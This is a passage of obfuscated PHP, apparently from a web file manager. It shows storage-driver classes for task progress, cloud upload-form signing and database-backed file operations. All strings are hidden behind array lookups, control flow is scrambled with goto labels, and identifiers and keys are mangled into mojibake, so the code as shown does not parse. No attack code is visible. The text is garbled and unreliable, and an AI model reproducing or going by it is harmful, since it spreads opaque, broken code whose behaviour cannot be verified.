== $AŒó¸‚Í[301]) { $BŒÂ¶•ˆÅ• = $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[977]] / $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[963]]; $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]] = 0.3 + $BŒÂ¶•ˆÅ• * 0.4; } else { if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1496]] == $AŒó¸‚Í[103]) { $Fé×¸”¦Ó = 0; if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1470]] == $AŒó¸‚Í[103]) { $Fé×¸”¦Ó = $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1469]]; } $BŒÂ¶•ˆÅ• = ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1473]] + $Fé×¸”¦Ó) / $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[682]]; $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]] = 0.3 + 0.4 + $BŒÂ¶•ˆÅ• * 0.3; } } } if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]] > 0) { $DğÉÖƒ§Ò = timeFloat() - $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1426]] - $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1429]]; $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1430]] = $DğÉÖƒ§Ò * (1 - $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]]) / $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]]; } } public function addFile($e¨½£¹Ó³•) { goto a¥ùõëêíˆ; e†ç‡ñ–¤Ë: $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[965]] = $E«ˆÉ¦Êë[1485]; $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[1470]] = $E«ˆÉ¦Êë[1027]; $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[682]] = $d÷êã·£˜Ã[$E«ˆÉ¦Êë[77]]; goto f¦Î››×ôç; dŒ–àÈ£¯ù: $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[1466]] = $d÷êã·£˜Ã[$E«ˆÉ¦Êë[28]]; $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[1468]] = $d÷êã·£˜Ã[$E«ˆÉ¦Êë[77]]; $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[1469]] = 0; goto e†ç‡ñ–¤Ë; a”ÈˆŠ‹œÚ: $this->update(); goto dîèÉ¹à±¹; a¥ùõëêíˆ: $E«ˆÉ¦Êë =& $_SERVER[“]; $D¯ô‹ŠÜ„ =& $this->task; $d÷êã·£˜Ã = IO::info($e¨½£¹Ó³•); goto dŒ–àÈ£¯ù; f¦Î››×ôç: $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[963]] = 1; $BÆ¡âó¥Ê = 0; $D¯ô‹ŠÜ„[$E«ˆÉ¦Êë[1477]] = array($E«ˆÉ¦Êë[1478] => $BÆ¡âó¥Ê + 1, $E«ˆÉ¦Êë[386] => $d÷êã·£˜Ã[$E«ˆÉ¦Êë[28]], $E«ˆÉ¦Êë[75] => $d÷êã·£˜Ã[$E«ˆÉ¦Êë[75]], $E«ˆÉ¦Êë[468] => $d÷êã·£˜Ã[$E«ˆÉ¦Êë[468]] ? $d÷êã·£˜Ã[$E«ˆÉ¦Êë[468]] : $d÷êã·£˜Ã[$E«ˆÉ¦Êë[75]]); goto a”ÈˆŠ‹œÚ; dîèÉ¹à±¹: } public function unzipAfter($CìˆÄ›°Äá) { goto FÎï½¸—®‚; BÜ™õÔï ´: $B©„ âäÆ = IO::infoWithChildren($CìˆÄ›°Äá); $fö×¾ˆÙ‚ = 0; $dÆº˜çÑ³[$CÉë™’ÊÅ[1477]] = array($CÉë™’ÊÅ[1478] => $fö×¾ˆÙ‚ + 1, $CÉë™’ÊÅ[386] => $B©„ âäÆ[$CÉë™’ÊÅ[28]], $CÉë™’ÊÅ[75] => $B©„ âäÆ[$CÉë™’ÊÅ[75]], $CÉë™’ÊÅ[468] => $B©„ âäÆ[$CÉë™’ÊÅ[468]] ? $B©„ âäÆ[$CÉë™’ÊÅ[468]] : $B©„ âäÆ[$CÉë™’ÊÅ[75]]); goto DôÒó¥ĞÌ; DôÒó¥ĞÌ: if ($B©„ âäÆ[$CÉë™’ÊÅ[29]] == $CÉë™’ÊÅ[167]) { $dÆº˜çÑ³[$CÉë™’ÊÅ[963]] = 1; } else { $dÆº˜çÑ³[$CÉë™’ÊÅ[963]] = $B©„ âäÆ[$CÉë™’ÊÅ[80]][$CÉë™’ÊÅ[78]]; } $dÆº˜çÑ³[$CÉë™’ÊÅ[965]] = $CÉë™’ÊÅ[33]; $dÆº˜çÑ³[$CÉë™’ÊÅ[1470]] = 0; goto BÆ¿ÁØÛ‚Ù; BÊ–¸ƒ´: $dÆº˜çÑ³[$CÉë™’ÊÅ[1466]] = $CÉë™’ÊÅ[33]; $dÆº˜çÑ³[$CÉë™’ÊÅ[1473]] = 0; $dÆº˜çÑ³[$CÉë™’ÊÅ[682]] = $B©„ âäÆ[$CÉë™’ÊÅ[77]]; goto aŞ×³öİèŒ; FÎï½¸—®‚: $CÉë™’ÊÅ =& $_SERVER[“]; $dÆº˜çÑ³ =& $this->task; $dÆº˜çÑ³[$CÉë™’ÊÅ[1496]] = $CÉë™’ÊÅ[103]; goto BÜ™õÔï ´; aŞ×³öİèŒ: $this->update(); self::log($CÉë™’ÊÅ[1498] . json_encode(array($dÆº˜çÑ³, $B©„ âäÆ))); goto aõŠÙóÂÀ; BÆ¿ÁØÛ‚Ù: $dÆº˜çÑ³[$CÉë™’ÊÅ[977]] = 0; $dÆº˜çÑ³[$CÉë™’ÊÅ[1468]] = 0; $dÆº˜çÑ³[$CÉë™’ÊÅ[1469]] = 0; goto BÊ–¸ƒ´; aõŠÙóÂÀ: } public function nameParse($Aâ˜ôÛÎ§ë) { goto côŒå†Úó¬; cÂÕ§Óàó¸: $this->update(); goto DŠµë™îˆÁ; Bùãò×Ş†£: $E¸ƒÎì¹å = get_path_this($Aâ˜ôÛÎ§ë); if (strstr($E¸ƒÎì¹å, $B‰ƒ‰ò¬Š[91])) { $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[977]] += 1; $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[963]] += 1; } $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[1466]] = $Aâ˜ôÛÎ§ë; goto cÂÕ§Óàó¸; côŒå†Úó¬: $B‰ƒ‰ò¬Š =& $_SERVER[“]; $CÎù¡ÏÉİÛ =& $this->task; if ($CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[1496]] == $B‰ƒ‰ò¬Š[1027]) { $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[1496]] = $B‰ƒ‰ò¬Š[301]; $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[1473]] = 0; $CÎù¡ÏÉİÛ[$B‰ƒ‰ò¬Š[682]] = 0; } goto Bùãò×Ş†£; DŠµë™îˆÁ: } } goto E‡İîöö¬Ä; FÔï„‰Äó: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eß—é›ŒæÄ) { parent::__construct($eß—é›ŒæÄ); $this->signatureVersion($_SERVER[“][200]); } public function uploadFormData($EéîØòÚ×æ, $c×ôÇîåÉô = 3600) { goto c×¯„Ñ‘Åß; e­ô¾ïáÓ¸: $b·»ŒÉ”·Ç = $d¢­Å¥óµª[1087]; $fÔ˜…Ñ‘Œó = gmdate($d¢­Å¥óµª[1088], time() + $c×ôÇîåÉô); $E¼Ğå»«´Ó = (string) time() . $d¢­Å¥óµª[67] . (string) (time() + $c×ôÇîåÉô); goto Fçˆ’“ §; Fçˆ’“ §: $aÙ‘‰ËÍ—Í = array($d¢­Å¥óµª[1089] => $fÔ˜…Ñ‘Œó, $d¢­Å¥óµª[1090] => array(array($d¢­Å¥óµª[1091] => $D˜­ÛË’), array($d¢­Å¥óµª[1092] => $this->bucket), array($d¢­Å¥óµª[1093], $d¢­Å¥óµª[1094], $d¢­Å¥óµª[33]), array($d¢­Å¥óµª[1095] => $b·»ŒÉ”·Ç), array($d¢­Å¥óµª[1096] => $E¥ù‰¤Å‡Á), array($d¢­Å¥óµª[1097] => $this->accessKey), array($d¢­Å¥óµª[1098] => $E¼Ğå»«´Ó))); $aÙ‘‰ËÍ—Í = json_encode($aÙ‘‰ËÍ—Í); $E¤ÆŞ™²ãµ = hash_hmac($d¢­Å¥óµª[218], $E¼Ğå»«´Ó, $this->secret); goto D¡ôò÷ÒÔ§; c×¯„Ñ‘Åß: $d¢­Å¥óµª =& $_SERVER[“]; $D˜­ÛË’ = $d¢­Å¥óµª[185]; $E¥ù‰¤Å‡Á = $d¢­Å¥óµª[218]; goto e­ô¾ïáÓ¸; Eçƒ½‘¬§: return $E™ÚÉïÁ…; goto f“šï’Œò°; D¡ôò÷ÒÔ§: $Cç§íÀ‘§× = sha1($aÙ‘‰ËÍ—Í); $Cí“²œË´¨ = hash_hmac($d¢­Å¥óµª[218], $Cç§íÀ‘§×, $E¤ÆŞ™²ãµ); $E™ÚÉïÁ… = array($d¢­Å¥óµª[1091] => $D˜­ÛË’, $d¢­Å¥óµª[1095] => $b·»ŒÉ”·Ç, $d¢­Å¥óµª[1099] => base64_encode($aÙ‘‰ËÍ—Í), $d¢­Å¥óµª[1096] => $E¥ù‰¤Å‡Á, $d¢­Å¥óµª[1097] => $this->accessKey, $d¢­Å¥óµª[1100] => $E¼Ğå»«´Ó, $d¢­Å¥óµª[1101] => $Cí“²œË´¨, $d¢­Å¥óµª[169] => $this->getHost()); goto Eçƒ½‘¬§; f“šï’Œò°: } public function fileOutLink($eÊ­ÚÂ£¡Ì) { $fÜ›°¼ç´¶ =& $_SERVER[“]; if (substr($eÊ­ÚÂ£¡Ì, 0, 7) == $fÜ›°¼ç´¶[1102]) { $eÊ­ÚÂ£¡Ì = $fÜ›°¼ç´¶[1103] . substr($eÊ­ÚÂ£¡Ì, 7); } header($fÜ›°¼ç´¶[156] . $eÊ­ÚÂ£¡Ì); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Bó‘ÄõîŒé) { $this->pathParse = $Bó‘ÄõîŒé; $this->model = Model($_SERVER[“][1104]); } public function getPath($cÜßƒ¹‡ĞÊ) { return trim($cÜßƒ¹‡ĞÊ, $_SERVER[“][8]); } public function pathFather($DË“Üã·µ) { $aóœÁìëßŠ = $this->parse($DË“Üã·µ); $aóœÁìëßŠ = $this->infoSimple($DË“Üã·µ); return $aóœÁìëßŠ ? $aóœÁìëßŠ[$_SERVER[“][463]] : !1; } public function getPathName($b‘„¥¼µÑ) { $CÈ´ì† = $this->infoSimple($b‘„¥¼µÑ); return $CÈ´ì† ? $CÈ´ì†[$_SERVER[“][28]] : !1; } public function getPathOuter($fÅæ‘öƒğò) { if (!$fÅæ‘öƒğò) { return $fÅæ‘öƒğò; } $CöÚÂ°Úæ = $this->parse($fÅæ‘öƒğò); return KodIO::make($CöÚÂ°Úæ[$_SERVER[“][367]]); } public function copyFolderFromIO($bÈŸĞ–Œ®, $eí¿ªÑ†«æ, $bˆÌòô×‰Ú, $fÚ¥í¶…Ô±, $e•§‚öè†²) { $f‚Û±ÚÛŒ¾ = $this->model->copyFolderFromIO($bÈŸĞ–Œ®, $eí¿ªÑ†«æ, $bˆÌòô×‰Ú, $fÚ¥í¶…Ô±, $e•§‚öè†²); return KodIO::make($f‚Û±ÚÛŒ¾); } public function isParentOf($f•¼ŠŠ£¯, $a³Æ‚œ¦Í…) { return $this->model->isParentOf($f•¼ŠŠ£¯, $a³Æ‚œ¦Í…); } public function mkfile($C’ÆÃ¯Òª«, $E¥°ˆ¨š‘ = '', $a´µˆ¨¿¬ = REPEAT_RENAME) { $F ”›İ©óÉ =& $_SERVER[“]; $b†ğœ„°ŸÆ = $this->parse($C’ÆÃ¯Òª«); $C’ÆÃ¯Òª« = $b†ğœ„°ŸÆ[$F ”›İ©óÉ[367]]; for ($CšÓë„‡Ñ’ = 0; $CšÓë„‡Ñ’ < count($b†ğœ„°ŸÆ[$F ”›İ©óÉ[1105]]); $CšÓë„‡Ñ’++) { $f†‹§ÀÕÏ = $b†ğœ„°ŸÆ[$F ”›İ©óÉ[1105]][$CšÓë„‡Ñ’]; if ($CšÓë„‡Ñ’ == count($b†ğœ„°ŸÆ[$F ”›İ©óÉ[1105]]) - 1) { $C’ÆÃ¯Òª« = $this->model->mkfile($C’ÆÃ¯Òª«, $f†‹§ÀÕÏ, $E¥°ˆ¨š‘, $a´µˆ¨¿¬); break; } $C’ÆÃ¯Òª« = $this->model->mkdir($C’ÆÃ¯Òª«, $f†‹§ÀÕÏ, REPEAT_SKIP); } return $this->getPathOuter($C’ÆÃ¯Òª«); } public function mkdir($e§©Â©ñÒŞ, $D´¹É…«µ = REPEAT_SKIP) { $d®ËµÁ¾„å =& $_SERVER[“]; $fÀ¸ÌÛğ› = $this->parse($e§©Â©ñÒŞ); $e§©Â©ñÒŞ = $fÀ¸ÌÛğ›[$d®ËµÁ¾„å[367]]; for ($b¯¹Ò®Ìö = 0; $b¯¹Ò®Ìö < count($fÀ¸ÌÛğ›[$d®ËµÁ¾„å[1105]]); $b¯¹Ò®Ìö++) { $bÀâîº®ÄÊ = $fÀ¸ÌÛğ›[$d®ËµÁ¾„å[1105]][$b¯¹Ò®Ìö]; $e§©Â©ñÒŞ = $this->model->mkdir($e§©Â©ñÒŞ, $bÀâîº®ÄÊ, $D´¹É…«µ); } return $this->getPathOuter($e§©Â©ñÒŞ); } public function copyFile($F°ËœØš¹Â, $CÙ…¥âöÌÀ, $e±„æó„Ïİ = REPEAT_REPLACE) { $dÍ©ø›´Ô =& $_SERVER[“]; $a‹†öÚá = $this->parse($CÙ…¥âöÌÀ); $A¿éö†•ºĞ = $this->model->copy($F°ËœØš¹Â, $a‹†öÚá[$dÍ©ø›´Ô[367]], $e±„æó„Ïİ, $a‹†öÚá[$dÍ©ø›´Ô[75]]); return $A¿éö†•ºĞ ? $this->getPathOuter($A¿éö†•ºĞ) : !1; } public function moveFile($fì²Ä¤ª»ã, $B©´È‘Äª–, $CŞÔ¨¢·…ô = REPEAT_REPLACE) { $c¥¿±˜Ê¶ğ =& $_SERVER[“]; $A¨ŠÅŒÙÀÓ = $this->parse($B©´È‘Äª–); $eŠ¼ˆíˆ¦´ = $this->model->move($fì²Ä¤ª»ã, $A¨ŠÅŒÙÀÓ[$c¥¿±˜Ê¶ğ[367]], $CŞÔ¨¢·…ô, $A¨ŠÅŒÙÀÓ[$c¥¿±˜Ê¶ğ[75]]); return $eŠ¼ˆíˆ¦´ ? $this->getPathOuter($eŠ¼ˆíˆ¦´) : !1; } public function copy($bì¿À”§ã, $dÍ©ê—ŠÈ¤, $fä¤¤œÀèÎ = REPEAT_REPLACE) { $CĞÜç½·èÂ = $this->parse($dÍ©ê—ŠÈ¤); $D¾•ŠÃ¦Ó® = $this->model->copy($bì¿À”§ã, $CĞÜç½·èÂ[$_SERVER[“][367]], $fä¤¤œÀèÎ); return $D¾•ŠÃ¦Ó® ? $this->getPathOuter($D¾•ŠÃ¦Ó®) : !1; } public function moveSameAllow() { } public function move($DˆÁÀÀ”Ä×, $E›ì»ôÏÔƒ, $A½ÒÃÆ©ò• = REPEAT_REPLACE) { $e÷¢ºåÂå½ = $this->parse($E›ì»ôÏÔƒ); $b¦ì‡‰¸Î´ = $this->model->move($DˆÁÀÀ”Ä×, $e÷¢ºåÂå½[$_SERVER[“][367]], $A½ÒÃÆ©ò•); return $b¦ì‡‰¸Î´ ? $this->getPathOuter($b¦ì‡‰¸Î´) : !1; } public function remove($AÂÇÏÔß», $C£™£ó©Á¯ = true) { return $this->model->remove($AÂÇÏÔß», $C£™£ó©Á¯); } public function rename($a–†À©Ê†, $c¬°×Üßİ‹) { $f†öŞå‡– = $this->model->rename($a–†À©Ê†, $c¬°×Üßİ‹); return $f†öŞå‡– ? $this->getPathOuter($a–†À©Ê†) : $f†öŞå‡–; } public function size($fòÂ¬Â©¸ƒ) { $eÂÙä´è­Ñ = $this->infoSimple($fòÂ¬Â©¸ƒ); return $eÂÙä´è­Ñ ? $eÂÙä´è­Ñ[$_SERVER[“][77]] : 0; } public function infoSimple($aïŠ¦ÜËªï) { return $this->model->sourceInfo($aïŠ¦ÜËªï); } public function info($fôñƒ«±Ùœ) { return $this->infoParse($fôñƒ«±Ùœ); } public function infoAuth($EÆ®ğµ¢›Ğ) { return $this->infoParse($EÆ®ğµ¢›Ğ, !1, !0); } public function infoWithChildren($d»õÔéßâ) { return $this->infoParse($d»õÔéßâ, !0); } protected function infoParse($E¾¤¾½‘ìò, $E³ªÛÛñÀÜ = false, $b ¦¼Ï˜Œ = false) { if (!$E³ªÛÛñÀÜ) { return $this->model->pathInfo($E¾¤¾½‘ìò, $b ¦¼Ï˜Œ); } return $this->model->pathInfoMore($E¾¤¾½‘ìò); } public function infoFull($fŒå¢ÎõÃ†) { $c¿”ìª˜à =& $_SERVER[“]; $b‹À¶ß…Ó = explode($c¿”ìª˜à[8], $fŒå¢ÎõÃ†); $F‡£±°òÔ¹ = implode($c¿”ìª˜à[8], array_splice($b‹À¶ß…Ó, 1)); return $this->model->pathInfoByPath($b‹À¶ß…Ó[0], $F‡£±°òÔ¹); } public function hashSimple($Fƒ‹æ¨ ˜) { $dàùí……î¡ =& $_SERVER[“]; $dôËò”×¹‹ = $this->infoWithChildren($Fƒ‹æ¨ ˜); return $dôËò”×¹‹[$dàùí……î¡[162]][$dàùí……î¡[164]]; } public function hashMd5($EÃ¾†ÜóÙÎ) { $Cë¿ÑÕÂ“å =& $_SERVER[“]; $b¡Åí ¸¾Ú = $this->infoWithChildren($EÃ¾†ÜóÙÎ); return $b¡Åí ¸¾Ú[$Cë¿ÑÕÂ“å[162]][$Cë¿ÑÕÂ“å[163]]; } public function exist($aÓïØÄÉ) { $bÚ½ÈÁ‡Ô’ =& $_SERVER[“]; $D˜¥Şô…·« = $this->parse($aÓïØÄÉ); if (!$D˜¥Şô…·«[$bÚ½ÈÁ‡Ô’[75]]) { return $this->isFile($aÓïØÄÉ) || $this->isFolder($aÓïØÄÉ); } $cùè‹Å¼áØ = array($bÚ½ÈÁ‡Ô’[368] => $D˜¥Şô…·«[$bÚ½ÈÁ‡Ô’[367]], $bÚ½ÈÁ‡Ô’[28] => $D˜¥Şô…·«[$bÚ½ÈÁ‡Ô’[75]]); $A‡‡‚„®ö† = $this->model->where($cùè‹Å¼áØ)->find(); return $A‡‡‚„®ö† ? !0 : !1; } public function isFile($DÕ¬¦í´Í) { $E…šÓù®äğ =& $_SERVER[“]; $AŒÜñ¢Ñ’½ = $this->infoSimple($DÕ¬¦í´Í); return $AŒÜñ¢Ñ’½ && $AŒÜñ¢Ñ’½[$E…šÓù®äğ[370]] == $E…šÓù®äğ[83] ? !1 : !0; } public function isFolder($A¨Ö²½Íì°) { $a¶ùêôÙÎÙ =& $_SERVER[“]; $C„ˆŒï†…„ = $this->infoSimple($A¨Ö²½Íì°); return $C„ˆŒï†…„ && $C„ˆŒï†…„[$a¶ùêôÙÎÙ[370]] == $a¶ùêôÙÎÙ[83] ? !0 : !1; } public function listPath($f°¦ˆ‡½Œ, $Eğç¾´Èƒ = false) { $FêÊ¨î¶Šè =& $_SERVER[“]; if ($f°¦ˆ‡½Œ == $FêÊ¨î¶Šè[33]) { return !1; } $d™‚¥ëÆÒø = array($FêÊ¨î¶Šè[368] => $f°¦ˆ‡½Œ); if ($Eğç¾´Èƒ) { return $this->model->listSource($d™‚¥ëÆÒø, -1); } return $this->model->listSource($d™‚¥ëÆÒø); } public function has($B½ñˆ¥ŞÇ, $AÈ£©İ©¼• = false, $Eİêù§À¾Ï = null) { $f¬ÄêâÜ‰æ =& $_SERVER[“]; $B¡ìùöä´ä = $this->infoWithChildren($B½ñˆ¥ŞÇ); if ($AÈ£©İ©¼•) { return array($f¬ÄêâÜ‰æ[192] => $B¡ìùöä´ä[$f¬ÄêâÜ‰æ[192]], $f¬ÄêâÜ‰æ[191] => $B¡ìùöä´ä[$f¬ÄêâÜ‰æ[191]]); } return $Eİêù§À¾Ï ? $B¡ìùöä´ä[$f¬ÄêâÜ‰æ[192]] : $B¡ìùöä´ä[$f¬ÄêâÜ‰æ[191]]; } public function listAll($b×¸ØŸÂİÓ) { $fˆ«µ×÷’‚ = IO::info($this->pathParse[$_SERVER[“][75]]); if (!$fˆ«µ×÷’‚) { return array(); } return $this->model->listAll($b×¸ØŸÂİÓ); } public function getContent($FÈÉùøö¸©) { return $this->model->getContent($FÈÉùøö¸©); } public function setContent($e–¸ËÇÂÇ, $EªºçŞ…ãá = '') { return $this->model->setContent($e–¸ËÇÂÇ, $EªºçŞ…ãá); } public function fileSubstr($Eùø„êÓ», $AÔä·¥Âì†, $A‡ƒãŞÑÇ²) { return $this->model->fileSubstr($Eùø„êÓ», $AÔä·¥Âì†, $A‡ƒãŞÑÇ²); } public function download($FäøÇå–Š, $f×—„Ú¹¦ç = '') { $E¥ÌÂë Œ§ = get_path_father($f×—„Ú¹¦ç); $c¢Ô¦­šÎ× = get_path_this($f×—„Ú¹¦ç); $e‰íŒ˜«« = $this->model->fileInfoGet($FäøÇå–Š); $a÷õ¢–‚’‹ = IO::copy($e‰íŒ˜««[$_SERVER[“][75]], $E¥ÌÂë Œ§, !1, $c¢Ô¦­šÎ×); return $a÷õ¢–‚’‹; } public function setModifyTime($eÌ’¡Ú¢Ù“, $Cà–Ö‚Â = '') { $this->model->metaSet($eÌ’¡Ú¢Ù“, $_SERVER[“][1106], $Cà–Ö‚Â); } public function upload($aµÜŠ¦›«Ô, $b¦¢ÛÙ§Ø•, $cö½öñåËí = false, $bÓ’‘‡‘· = REPEAT_REPLACE) { $d°Ç¯ÙÙˆÚ =& $_SERVER[“]; $Cíš‰èÕ¹ = $this->parse($aµÜŠ¦›«Ô); $CŸõÉÖí‚¥ = $this->model->addFile($Cíš‰èÕ¹[$d°Ç¯ÙÙˆÚ[367]], $b¦¢ÛÙ§Ø•, $Cíš‰èÕ¹[$d°Ç¯ÙÙˆÚ[75]], $cö½öñåËí, $bÓ’‘‡‘·); return $this->getPathOuter($CŸõÉÖí‚¥); } public function uploadFileByID($dãÛ…„Ï”è, $BŒ¹§Ö‹Ë, $E‰ÍØœ’ÏØ) { $Dï„…Û¾É— =& $_SERVER[“]; $cˆˆğŒÖÖ¾ = $this->parse($dãÛ…„Ï”è); $f‹¦¾ø‹ÉŠ = $this->model->addFileByFileID($cˆˆğŒÖÖ¾[$Dï„…Û¾É—[367]], $BŒ¹§Ö‹Ë, $cˆˆğŒÖÖ¾[$Dï„…Û¾É—[75]], $E‰ÍØœ’ÏØ); return $this->getPathOuter($f‹¦¾ø‹ÉŠ); } public function addFileByRemote($A´Îº¤¶‚, $bœéò‡œ…ç, $c½çâï‹ = array(), $CÑÁæò•ô¯ = '', $a¼™‰­‹ä) { $A¥ƒ¹Ü»•± =& $_SERVER[“]; $B‘ëîÊ Ùâ = $this->parse($A´Îº¤¶‚); $CÑÁæò•ô¯ = empty($CÑÁæò•ô¯) ? $B‘ëîÊ Ùâ[$A¥ƒ¹Ü»•±[75]] : $CÑÁæò•ô¯; $dƒ¼–º†–¸ = $this->model->addFileByRemote($B‘ëîÊ Ùâ[$A¥ƒ¹Ü»•±[367]], $bœéò‡œ…ç, $CÑÁæò•ô¯, $c½çâï‹, $a¼™‰­‹ä); return $this->getPathOuter($dƒ¼–º†–¸); } public function uploadLink($a­Ğ÷¶¯ã, $BÒİ‰´¼İ¸ = 0) { $BäØÂéøÀƒ =& $_SERVER[“]; $aËé«£—ã‰ = $this->parse($a­Ğ÷¶¯ã); $a­Ğ÷¶¯ã = Model($BäØÂéøÀƒ[546])->createFileName($aËé«£—ã‰[$BäØÂéøÀƒ[75]]); $E©òÒÂ“å² = IO::uploadLink($a­Ğ÷¶¯ã, $BÒİ‰´¼İ¸); return $E©òÒÂ“å²; } public function fileNameAuto($c¤µ ¾Š , $f¦ØÄ˜ÍÚ—, $Cø…Ïîùæ = REPEAT_REPLACE, $Aé—‚âšé‘ = false) { return $this->model->fileNameAuto($c¤µ ¾Š , $f¦ØÄ˜ÍÚ—, $Cø…Ïîùæ, $Aé—‚âšé‘); } public function fileNameExist($aÃ¬ÓãÉë, $a˜ËÉÚÇ½Ó) { return $this->model->fileNameExist($aÃ¬ÓãÉë, $a˜ËÉÚÇ½Ó); } protected function _fileOut($eÈÙ¶¢Â¦É, $E±ùˆµ™« = false, $fÕÒ„›×„ = false, $f®Ä¾ÇÜ = '', $F¸™ŸåÌ¿ = false) { goto D—´Ğ±Óœ; Eöˆ±¼õ‚’: if ($F¸™ŸåÌ¿) { return IO::fileOutServer($aÖº÷é†Ü[$eä³–½º“Š[75]], $E±ùˆµ™«, $dÜà¬µÒó, $f®Ä¾ÇÜ); } IO::fileOut($aÖº÷é†Ü[$eä³–½º“Š[75]], $E±ùˆµ™«, $dÜà¬µÒó, $f®Ä¾ÇÜ); goto c½ˆ¤¦¸öÀ; D—´Ğ±Óœ: $eä³–½º“Š =& $_SERVER[“]; $bÂÑœùøšó = $this->model->sourceInfo($eÈÙ¶¢Â¦É); if ($bÂÑœùøšó[$eä³–½º“Š[370]] == $eä³–½º“Š[83]) { header($eä³–½º“Š[1107]); die; } goto CÏÄº¬éÚÏ; CÏÄº¬éÚÏ: $aÖº÷é†Ü = $this->model->fileInfoGet($eÈÙ¶¢Â¦É); $f®Ä¾ÇÜ = $aÖº÷é†Ü[$eä³–½º“Š[163]] ? $aÖº÷é†Ü[$eä³–½º“Š[163]] : $f®Ä¾ÇÜ; $dÜà¬µÒó = isset($GLOBALS[$eä³–½º“Š[1108]]) ? $GLOBALS[$eä³–½º“Š[1108]] : $bÂÑœùøšó[$eä³–½º“Š[28]]; goto Eöˆ±¼õ‚’; c½ˆ¤¦¸öÀ: } public function fileOut($f¦Èâ÷¾, $fîÙêÜ…ç = false, $dôëÓé“± = false, $e¢ˆÍ×°ê = '') { $this->_fileOut($f¦Èâ÷¾, $fîÙêÜ…ç, $dôëÓé“±, $e¢ˆÍ×°ê); } public function fileOutServer($EšÌ”ËàÛä, $C‚ÍòÃ•Úˆ = false, $EŠ‹â½öªÇ = false, $d»»ä£Ş = '') { $this->_fileOut($EšÌ”ËàÛä, $C‚ÍòÃ•Úˆ, $EŠ‹â½öªÇ, $d»»ä£Ş, !0); } protected function _fileOutImage($d¤îÉ¿ŞÇÏ, $B”Çî‰ÊÉ» = 250) { $e†À½Ì™© =& $_SERVER[“]; $BÒéš´¬êÔ = $this->model->sourceInfo($d¤îÉ¿ŞÇÏ); if ($BÒéš´¬êÔ[$e†À½Ì™©[370]] == $e†À½Ì™©[83]) { show_json($e†À½Ì™©[1109] . $d¤îÉ¿ŞÇÏ, !1); } $GLOBALS[$e†À½Ì™©[1108]] = $BÒéš´¬êÔ[$e†À½Ì™©[28]]; $CÁ…äÌ”–· = $this->model->fileInfoGet($d¤îÉ¿ŞÇÏ); IO::fileOutImage($CÁ…äÌ”–·[$e†À½Ì™©[75]], $B”Çî‰ÊÉ»); } public function fileOutImage($eõ«šÑ–ŸŒ, $dçñÌá®” = 250) { $this->_fileOutImage($eõ«šÑ–ŸŒ, $dçñÌá®”); } public function fileOutImageServer($e‘Øğ¤“–, $BæñÈÙª·Ö = 250) { $this->_fileOutImage($e‘Øğ¤“–, $BæñÈÙª·Ö); } public function link($Aƒ÷¹ïÚ£, $AÀŒˆ— ”’ = '') { $b“Ë¤İóäÖ = $this->model->fileInfoGet($Aƒ÷¹ïÚ£); return IO::link($b“Ë¤İóäÖ[$_SERVER[“][75]], $AÀŒˆ— ”’); } protected function parse($cÆöÉ¼´ä) { $E¡×¸Ô’ñ¸ =& $_SERVER[“]; if (strstr($cÆöÉ¼´ä, $E¡×¸Ô’ñ¸[8]) === !1) { return array($E¡×¸Ô’ñ¸[385] => intval($cÆöÉ¼´ä), $E¡×¸Ô’ñ¸[75] => $E¡×¸Ô’ñ¸[33], $E¡×¸Ô’ñ¸[1105] => array()); } $dŒ›ÙæØù = explode($E¡×¸Ô’ñ¸[8], trim($cÆöÉ¼´ä, $E¡×¸Ô’ñ¸[8])); if (count($dŒ›ÙæØù) < 2) { show_tips($cÆöÉ¼´ä . $E¡×¸Ô’ñ¸[1110]); } return array($E¡×¸Ô’ñ¸[385] => intval($dŒ›ÙæØù[0]), $E¡×¸Ô’ñ¸[75] => $dŒ›ÙæØù[1], $E¡×¸Ô’ñ¸[1105] => array_slice($dŒ›ÙæØù, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($D®¢Öä›öª) { $this->pathParse = $D®¢Öä›öª; $this->model = Model($_SERVER[“][1104]); } public function getPathOuter($Fˆí‚£¾Å) { $A©ÌÑ­Ï°Ş =& $_SERVER[“]; if (!$Fˆí‚£¾Å) { return $Fˆí‚£¾Å; } $EøÔµ—“ = $this->parse($Fˆí‚£¾Å); return trim(KodIO::makeShare($this->pathParse[$A©ÌÑ­Ï°Ş[367]], $EøÔµ—“[$A©ÌÑ­Ï°Ş[367]]), $A©ÌÑ­Ï°Ş[8]); } protected function infoParse($B‰ß¿ò‡†, $BÂ©â‡„ÚË = false, $Eæœ˜­¾Œ = false) { $fğ³¥·‚à =& $_SERVER[“]; $A«ÊáÅÆå = $this->pathParse[$fğ³¥·‚à[367]]; $c°ÕÀÏ¶ß„ = trim($this->pathParse[$fğ³¥·‚à[999]], $fğ³¥·‚à[8]); return Action($fğ³¥·‚à[1111])->sharePathInfo($A«ÊáÅÆå, $c°ÕÀÏ¶ß„); } public function 